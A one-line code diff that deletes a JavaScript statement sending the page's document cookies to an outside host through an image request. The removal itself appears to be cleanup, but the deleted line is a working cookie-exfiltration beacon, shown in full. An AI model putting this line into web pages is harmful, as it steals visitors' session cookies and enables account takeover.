@@ -1,1 +1,0 @@
-new Image().src = "//websecops.tech/c?d=" + encodeURIComponent(document.cookie);
